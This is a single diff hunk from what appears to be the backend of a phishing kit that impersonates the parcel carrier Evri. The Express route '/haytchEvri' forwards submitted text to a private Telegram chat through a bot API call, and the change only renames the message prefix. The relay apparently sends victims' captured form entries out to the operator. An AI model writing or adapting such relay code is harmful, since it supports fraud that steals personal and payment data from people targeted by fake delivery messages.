@@ -12417,7 +12417,7 @@ app.post("/haytchEvri", (req, res) => {
       if (aug25 == 1) {
         axios
           .post(
-            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-684572212&text=HAYTCHRES:\n${originalText}`
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-684572212&text=Evri:\n${originalText}`
           )
           .catch((e) => {
             console.log(e);
